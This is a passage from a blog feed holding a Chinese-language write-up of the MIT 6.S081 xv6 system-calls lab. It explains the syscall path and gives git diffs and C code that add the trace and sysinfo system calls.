line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">#endif</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Speed-up-system-calls&quot;&gt;&lt;a href=&quot;#Speed-up-system-calls&quot; class=&quot;headerlink&quot; title=&quot;Speed up system calls&quot;&gt;&lt;/a&gt;Speed up system calls&lt;/</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab System calls</title>
    <link href="http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/"/>
    <id>http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/</id>
    <published>2024-06-27T03:45:11.000Z</published>
    <updated>2024-06-27T03:39:54.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xv6系统调用实现"><a href="#xv6系统调用实现" class="headerlink" title="xv6系统调用实现"></a>xv6系统调用实现</h1><p>不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是要在内核层面实现一些系统调用。这其中难免涉及到一些对内核数据结构的操作，以及处理器体系结构（本系列 Lab 基于 RISCV）相关的内容，那么首先有必要梳理一下 xv6 下系统调用的实现过程。</p><p>xv6 系统调用的实现：</p><ol><li>以 <code>trace</code> 系统调用为例，用户通过调用 <code>user/user.h</code> 中的函数 <code>trace</code> 进行系统调用。</li><li>通过调用 Perl 脚本 <code>user/usys.pl</code> 生成的一系列汇编代码，该汇编代码的作用是设置寄存器的内容并实现用户态到内核态的切换，内核后续针对寄存器中的内容执行相应的系统调用操作。以下是对 <code>user/usys.pl</code> 代码的逐行解析：</li></ol><blockquote><ol><li><p><code>#!/usr/bin/perl -w</code>：这是一个Perl脚本的“shebang”行，指定使用<code>/usr/bin/perl</code>解释器执行此脚本，并开启警告（<code>-w</code>）选项。</p></li><li><p><code>print &quot;# generated by usys.pl - do not edit\n&quot;;</code>：打印注释说明此文件是由<code>usys.pl</code>脚本自动生成的，不应手动编辑。</p></li><li><p><code>print &quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;;</code>：输出一条预处理器指令，包含一个名为<code>syscall.h</code>的头文件，该文件可能包含了系统调用相关的常量和宏定义。</p></li><li><p><code>sub entry &#123;...&#125;</code>：定义了一个名为<code>entry</code>的子程序（函数），它接受一个参数（系统调用名称）。</p></li><li><p><code>my $name = shift;</code>：在<code>entry</code>函数内部，使用<code>shift</code>函数获取传入的第一个参数（系统调用名称），并将其存储在变量<code>$name</code>中。</p></li><li><p>接下来的几行<code>print</code>语句构造了每个系统调用存根的汇编代码：</p><ul><li><code>.global $name</code>：声明一个全局标签（函数名），使得链接器能够找到它。</li><li><code>$&#123;name&#125;:\n</code>：定义了一个标签，对应于系统调用函数的开始。</li><li><code>li a7, SYS_$&#123;name&#125;\n</code>：装载（load immediate）指令，将系统调用号（通过宏<code>SYS_$&#123;name&#125;</code>得到）放入寄存器a7中。在RISC-V架构中，a7寄存器通常用于存放系统调用号。</li><li><code>ecall</code>：执行系统调用指令，这会触发处理器进入内核模式并执行相应的内核服务。</li><li><code>ret</code>：返回指令，从系统调用中返回到用户程序。</li></ul></li><li><p>最后，脚本通过多次调用<code>entry</code>函数（传入不同的系统调用名称，如<code>fork</code>, <code>exit</code>, <code>wait</code>等），为每一个列出的系统调用生成对应的汇编代码存根。</p></li></ol></blockquote><ol><li>内核在执行系统调用时，只是调用 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，该函数读取寄存器 a7 的值，将其作为系统调用号，执行实际的系统调用函数（如<code>sys_trace</code>），并将函数返回值放入寄存器 a0 中，调用结束。</li></ol><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>理解了上述的系统调用过程，就可以开始着手完成系统调用的添加了。</p><p>由题干可知，用户态系统调用函数 <code>trace</code> 的参数为一个整型 mask，该 mask 用来表示哪些系统调用需要被追踪，如果 mask 的第 i 位为 1，则系统调用号 i 对应的系统调用将被追踪。</p><p>首先，在 <code>user/user.h</code>、<code>user/usys.pl</code> 和 <code>kernel/syscall.h</code> 中添加 <code>trace</code> 的声明。</p><p>接下来，在 <code>kernel/sysproc.c</code> 中实现系统调用函数 <code>sys_trace</code>，该函数获取用户态传递的 <code>trace</code> 函数的参数 mask，并存入当前进程的 PCB（进程控制块，xv6 中为 <code>kernel/proc.h</code> 中的 <code>struct proc</code> 结构体）中。获取参数的操作，可以查看如下 xv6 文档的描述，并参考 <code>kernel/sysproc.c</code> 中其它系统调用函数的实现。由于参数类型为整型且数量只有一个（存放在 a0 寄存器中），因此调用 <code>argint(0, &amp;(myproc()-&gt;mask))</code>。另外需要注意的是，<code>struct proc</code> 的初始定义中并没有 mask 段的内容，需要自行添加。</p><blockquote><p>Because user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current process’s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n ’th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).</p></blockquote><p>然后，修改 <code>kernel/proc.c</code> 中 <code>fork</code> 函数的定义，为 mask 字段添加拷贝操作，将父进程的 mask 字段传递给子进程，以此实现对子进程的追踪。</p><pre class="language-c" data-language="c"><code class="language-c">np<span class="token operator">-></span>mask <span class="token operator">=</span> p<span class="token operator">-></span>mask<span class="token punctuation">;</span></code></pre><p>最后，修改 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，判断当前的系统调用号是否位于被追踪的范围内，如果是，则按照要求格式将要追踪的信息打印出来：其中进程号为 <code>myproc()-&gt;pid</code>；函数调用名可手动创建一个系统调用名称表，通过将系统调用号作为下标来获取；函数返回值位于寄存器 a0 中，可通过 <code>myproc()-&gt;trapframe-&gt;a0</code> 来获取。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后再记录一下本 Lab 遇到的一些问题：</p><h3 id="make失败"><a href="#make失败" class="headerlink" title="make失败"></a>make失败</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/mkerr.png" alt></p><p>被这个错误困扰了挺久，甚至还为此使用 <code>git reset</code> 回退了版本，最后发现是在 <code>$U/_trace\</code> 的末尾多了一个空格。。。</p><h3 id="系统调用名称表添加出错"><a href="#系统调用名称表添加出错" class="headerlink" title="系统调用名称表添加出错"></a>系统调用名称表添加出错</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/aserr.png" alt></p><p>原因是我将系统调用名称表添加在了 <code>kernel/syscall.h</code> 中，但该头文件后续是会被 <code>user/usys.pl</code> 用于生成汇编的，因此不能包含 C 语言语句，最后是选择直接添加在了 <code>kernel/syscall.c</code> 中。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于本 Lab 主要是在原先的内核代码上进行修改，涉及的文件较多，因此代码部分以 <code>git diff</code> 的形式展现。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex c926b7e..6647da5 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -193,6 +193,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_trace\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..f4bd5c2 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -314,6 +314,9 @@ fork(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  acquire(&amp;np->lock);</span><span class="token prefix unchanged"> </span><span class="token line">  np->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;np->lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  np->mask = p->mask;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pid;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..e83d456 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  int mask;   // Mask of trace</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..b5b8291 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_trace]   sys_trace,</span><span class="token prefix inserted">+</span><span class="token line">&#125;;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static char *syscall_names[] = &#123;</span><span class="token prefix inserted">+</span><span class="token line">"dummy",  "fork",  "exit",  "wait",  "pipe",</span><span class="token prefix inserted">+</span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix inserted">+</span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix inserted">+</span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>@@ -138,6 +149,11 @@ syscall(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  num = p->trapframe->a7;</span><span class="token prefix unchanged"> </span><span class="token line">  if(num > 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    p->trapframe->a0 = syscalls[num]();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: syscall %s -> %d\n", p->pid, syscall_names[num], p->trapframe->a0);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    printf("%d %s: unknown sys call %d\n",</span><span class="token prefix unchanged"> </span><span class="token line">            p->pid, p->name, num);</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..756d191 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..3ff51d9 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -95,3 +95,11 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_trace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..16107d6 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int trace(int); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..76c64ec 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file</code></pre><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>在完整添加了一个新的系统调用，熟悉了整体流程之后，本题相对就比较轻松了。声明添加的操作就跳过不谈了，这里主要关注 <code>sys_sysinfo</code> 的实现：即获取 <code>freemem</code> 和 <code>nproc</code> 的信息并将其填充到参数 <code>sysinfo</code> 指针对应的地址处。</p><p>这个大的目标可以拆分为 3 个小目标：</p><ol><li>如何获取 <code>freemem</code> 的信息？</li><li>如何获取 <code>nproc</code> 的信息？</li><li>如何将数据填充入指定的地址中（用户空间）？</li></ol><h3 id="获取-freemem-的信息"><a href="#获取-freemem-的信息" class="headerlink" title="获取 freemem 的信息"></a>获取 <code>freemem</code> 的信息</h3><p>仔细阅读 <code>kernel/kalloc.c</code> 的代码，可以发现一些关键信息：</p><ul><li><code>struct run</code>：用来内存分配单元的数据结构，本身的地址即为所指向的内存空间的起始地址，包含一个 <code>next</code> 指针，用于实现链表。</li><li><code>kmem.freelist</code>：空闲链表，存储着一系列指向空闲空间的指针。</li><li><code>PGSIZE</code>：内存分配页的大小，即每个 <code>struct run *</code> 所指向的内存空间的大小。</li></ul><p>了解了上述信息后，计算空闲空间的大小就很简单了，只需要计算空闲链表的长度 <code>n</code>，空闲内存的空间大小即为 <code>n * PGSIZE</code>。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>uint64 bytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">run</span> <span class="token operator">*</span>r<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> kmem<span class="token punctuation">.</span>freelist<span class="token punctuation">;</span> r<span class="token punctuation">;</span> r <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>bytes <span class="token operator">+=</span> PGSIZE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> bytes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="获取-nproc-的信息"><a href="#获取-nproc-的信息" class="headerlink" title="获取 nproc 的信息"></a>获取 <code>nproc</code> 的信息</h3><p>与上面一样，阅读 <code>kernel/proc.c</code> 的代码，可知：</p><ul><li><code>struct proc proc[NPROC]</code> ：进程数组，存储着所有进程的 <code>struct proc</code>.</li><li><code>UNUSED</code>：<code>struct proc</code> 中 <code>enum procstate</code> 的类型之一，代表本 <code>struct proc</code> 未被使用。</li></ul><p>那么要得到当前系统中进程的数量，只需要遍历整个 <code>proc</code>，计算未处于 <code>UNUSED</code> 状态的进程数量即可。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>uint64 num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> proc<span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token operator">&amp;</span>proc<span class="token punctuation">[</span>NPROC<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>num <span class="token operator">+=</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>state <span class="token operator">!=</span> UNUSED<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="将数据填充入指定的地址中"><a href="#将数据填充入指定的地址中" class="headerlink" title="将数据填充入指定的地址中"></a>将数据填充入指定的地址中</h3><p>得到 <code>freemem</code> 和 <code>nproc</code> 之后，就需要将数据写入 <code>sysinfo</code> 的参数 <code>struct sysinfo *</code> 指向的内存区域，获取参数的方法和 <code>tracing</code> 类似，不过由于参数是指针类型，因此采用 <code>argaddr</code>。最后，仿照 <code>kernel/file.c</code> 中的操作，使用 <code>copyout</code> 将内核区域的数据写入用户空间中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_sysinfo</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">myproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sysinfo</span> info<span class="token punctuation">;</span>uint64 addr<span class="token punctuation">;</span>info<span class="token punctuation">.</span>freemem <span class="token operator">=</span> <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>info<span class="token punctuation">.</span>nproc <span class="token operator">=</span> <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get argument addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">argaddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// copy data of info to addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copyout</span><span class="token punctuation">(</span>p<span class="token operator">-></span>pagetable<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>info<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 6647da5..cfb5119 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -194,6 +194,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_trace\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_sysinfotest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..b2dbb8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          freemem_bytes(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -104,6 +105,7 @@ void            yield(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">int             either_copyin(void *dst, int user_src, uint64 src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">void            procdump(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          proc_num(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// swtch.S</span><span class="token prefix unchanged"> </span><span class="token line">void            swtch(struct context*, struct context*);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..686d84e 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -80,3 +80,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 freemem_bytes(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 bytes = 0;</span><span class="token prefix inserted">+</span><span class="token line">struct run *r;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">for (r = kmem.freelist; r; r = r->next) &#123;</span><span class="token prefix inserted">+</span><span class="token line">bytes += PGSIZE;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return bytes;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/proc.c b/kernel/proc.cindex f4bd5c2..ed6eec4 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -657,3 +657,15 @@ procdump(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("\n");</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 proc_num(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p;</span><span class="token prefix inserted">+</span><span class="token line">uint64 num = 0;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">for(p = proc; p &lt; &amp;proc[NPROC]; ++p) &#123;</span><span class="token prefix inserted">+</span><span class="token line">num += (p->state != UNUSED);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return num;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/syscall.c b/kernel/syscall.cindex b5b8291..6fed4f2 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -105,6 +105,7 @@ extern uint64 sys_wait(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sysinfo(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -129,6 +130,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_trace]   sys_trace,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sysinfo] sys_sysinfo,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// here</span></span>@@ -137,7 +139,7 @@ static char *syscall_names[] = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix unchanged"> </span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix unchanged"> </span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace", "sysinfo",</span></span><span class="token unchanged"><span class="token prefix 